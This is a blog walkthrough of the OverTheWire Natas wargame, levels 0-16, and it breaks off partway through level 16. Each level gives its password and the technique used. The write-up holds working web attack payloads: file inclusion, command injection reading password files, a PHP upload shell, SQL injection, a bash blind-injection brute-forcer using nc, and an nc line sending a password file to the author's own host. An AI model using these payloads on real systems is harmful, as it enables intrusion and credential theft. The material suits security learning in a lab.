---
title: Natas Walkthrough (0-16) - OverTheWire.org
date: 2015-11-20
categories: [Writeups, OverTheWire.org]
image:
    path: "unsorted/otw.jpg"
---

Another fast walthrough of one of the most famous wargames out there.

**natas0** 

The password is in the page source code.

gtVrDuiDfck831PqWsLEZy5gyDz1clto


**natas1**

Same thing as natas0.

ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi


**natas2**

There is a something new on the page: an invisible image 1x1.  This is a hint
to the directory "/files" where we can find the pass.

sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14


**natas3** 

The challenge is just suggesting us to search on google the page address to get
the directory listing.

Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

**natas4**

Just change the HTTP referer to pass this level.

iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 

**natas5**

This time we need to modify a cookie in order to login.

aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1


**natas6**

We need to go to include/secret.inc to see the secret: FOEIUWGHFEEUHOFUOIU  
Once we know the secret we can get the password.

7z3hEENjQtflzgnT29q7wAvMNfZdh0i9


**natas7**

Here we are finally in front of a real vulnerability:
<https://en.wikipedia.org/wiki/File_inclusion_vulnerability>.   
We know that the password is in the file "/etc/natas_webpass/natas7", we can
get it like this:

<http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas7>

7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 


**natas8**

From the given code we can see the value of the encoded secret, we need to
decode it back, fortunately we know how it's encoded.

Following the program we cas see what we need to do: convert the encoded secret
back to ASCII, then revert and base64 decode the secret, we obtain: oubWYf2kBq.
Now we can get the password.

W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl


**natas9**

Another pretty dangerous vulnerability on the code, we can practically make the
system execute whatever thing we write: ` ; cat /etc/natas_webpass/natas10; `

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu


**natas10**

Pretty much the same thing as natas9: 
`-v "thisstringwillbenotfound" /etc/natas_webpass/natas11`

U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK


**natas11**

Here things get a little bit more complicated.  We need to feed the server with
an encoded cookie, which represent a json object containing certaines
attributes.

It must be encoded this way:
1. XOR encoded with a secret key
2. then base64 encoded

Basically, we need to discover the key, once we have it we can solve the
challenge.  We know that:

cookie XOR key = xorencoded_cookie

then we have also: 

cookie XOR xorencoded_cookie = key

Now what we need is just a cookie that has been encoded by the server, we can
find it in our browser. We need to base64 decode it in order to obtain the pure
xor encoded version, and then perform a xor operation with the json string of
cookie by default.
In order to avoid mistakes due to the different encoding functions 
(or whatever...) better use the same language to get the key. In our case we can 
just modify a bit the given script:
 
```php
$mycookie = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=';
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($text,$key) {

    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}


print xor_encrypt(base64_decode($mycookie),json_encode($defaultdata)) . "\n";
```



Executing it with a php interpreter I get the string:
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq

The key must be "qw8J"

Now we can encode the cookie we wanted to, just need to add some line to the
previous code:

```php
$key = "qw8J";
$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");


print base64_encode(xor_encrypt(json_encode($data),$key)) . "\n";
```


I get this result:
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

Once we send the encoded cookie as "data" cookie we will get the password to 
the next level.

EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3




**natas12**

In this level we can upload files in the server and get their link.  The
website ask us to upload images, but it doesn't make sure the file we upload in
actually an image...  So we decide to give a php file:

```php
<?php include "/etc/natas_webpass/natas13" ?>
```


The website renames the file with the extension .jpg but it does it client
side...  so we can change it to php (so the server will parse it) tampering our
request (or trough the attributes of the form). Once we open the link to the
file, we receive the password:


jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY


**natas13**

Same thing as before, but this time the server check if the file we give to him
is an image using the function *exif_imagetype*. After a fast search on google
we can figure out how this function works: it checks the magic number at the
beginning of the file to determine his type.

We need just to search the magic number of jpg files and add it at the
beginning of the file.

Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 


**natas14**

Time for some SQL injection, lets try this username: foo" OR 1=1;#

AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J



**natas15**

This time we can still perform SQL injections but what we can just get to know
if our query produces some result. This is still a quite big open door on the
content of the database. We can start to ask the database if he knows any user
whose name starts by 'a': `" OR username LIKE BINARY "a%" ;#` Note the use of
"BINARY" in order to obtain a case sensitive match.  The server answers "This
user exists!", cool ... let's try now with 'ab', 'ac', etc ... This is a
reasonably fast way to get the content of the database, so I made a bash script
to do the work for me:

```bash
#!/bin/bash

query_storm(){

    local USERNAME=$1
    local CONTENT_LENGTH=54
    [ $2 ] && local CONTENT_LENGTH=$2
    
    
    local HEADER="POST / HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: natas15.natas.labs.overthewire.org
Accept-Language: en-us
Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: $CONTENT_LENGTH\r\n\r\n"
    
    for CHAR in {A..Z} {a..z} {0..9}
    do
    
    echo "try: $USERNAME$CHAR"  

    local CONTENT="username=a%%22+OR+username+LIKE+BINARY+%%22$USERNAME$CHAR%%25%%22%%3B%%23"
    
        if printf "$HEADER$CONTENT" | nc natas15.natas.labs.overthewire.org 80 | grep -q "This user exists."
        then
            if [ $(ps -e | grep $(basename "$0") | wc -l ) -lt 20 ]
            then
                "$0" "$USERNAME$CHAR" $(($CONTENT_LENGTH+1)) &
            else
                query_storm "$USERNAME$CHAR" $(($CONTENT_LENGTH+1))
            fi
        fi
    
    done
    
    
    CONTENT="username=a%%22+OR+username+LIKE+BINARY+%%22$USERNAME%%22%%3B%%23%%23"
    if printf "$HEADER$CONTENT" | nc natas15.natas.labs.overthewire.org 80 | grep -q "This user exists."
    then
        echo "--------------> MATCH: $USERNAME"
    fi
    
}

query_storm "$1" "$2"
```



Once called this script will perform a storm of queries, it will print a
message "try: username" for every username it is about to test. Every time it
finds a match it explores it further (e.g. "pet" works ==> "pete" works ==>
"peter").  Every time an username is found it will print out "---------->
MATCH:" followed by the username. So, if we want to see clearly all the
usernames in the database we can just do: `./natas15.sh | grep "MATCH"`, here
is the output:

```text
--------------> MATCH: bob
--------------> MATCH: alice
--------------> MATCH: charlie
--------------> MATCH: natas16
```

Cool, there is a user called "natas16", I bet his password is the password to
enter the next level. We can use the same script to get all the passwords in
the database, we just need to change "username" with "password" in the query,
we could even change the query to find the password just for the user
"natas16".  It takes a little bit more time, but we get our passwords:


```text
--------------> MATCH: HLwuGKts2w
--------------> MATCH: hROtsfM734
--------------> MATCH: 6P151OntQe
--------------> MATCH: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

Now we just need to try them on the next level...and finally one of them works!

WaIHEacj63wnNIBROHeqi3p9t0m5nhmh



**natas16**

Well, for the record I found this level quite annoying...  So, first of all
let's see what we are supposed to do: basically the server will take the data
we give him as input check if it contains any character between those:
[;|&`\'"] and, if not perform a search in the file dictionary.txt using the
program grep.

One of the first thing that I realized was "cool, I can use $(...) to execute
whatever command and I can still perform redirections". Unfortunately we are
not able to get the output of the commands we execute, the only things we can
do is hope it will match with any word of the dictionary. 

So, one of my first attempts was to find a way to get that output. What about
send it to myself trough internet ? ...this could work, then I tried `$(nc
mypubblicIPaddress 55555 < /etc/natas_webpass/natas17)` while I was listening
on my machine on the same port, but it didn't work (there must be some kind of
restriction).

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
The command cut can help us, lets see for example what are the second and third
character of the password  `$(cut -c2-3  < /etc/natas_webpass/natas17)`.
We get:
    airstrips
    amps
    apprenticeships
    archbishops
    autopsied
    autopsies
    autopsy
    autopsy's
    autopsying
    battleships
    bellhops
    bishops
    blacktops
    blimps
    blips
    bookshops
    bumps
    burps
    buttercups
    camps
    caps
    capsize
    capsized
    capsizes
    capsizing
    capsule
    capsule's
    capsuled
    capsules
    capsuling
    carps
    ...


It must be "ps" as it is present in all of the words, cool we are on the right
way!  But what about the numbers? The dictionary doesn't contain any number
then we cannot match them.  Here uncle ASCII come to help us: in the ascii
table the numbers (from 0 to 9) are represented using the entries from 48 to 57
(in decimal), the first letter happens to be the 'A' at the position 65.  A
little math lets us know that if we would be able to add 17 units to the binary
value of our numbers we could map them using letters: 0 -> A, 1 -> B, 2 -> C ..
etc...

continues..

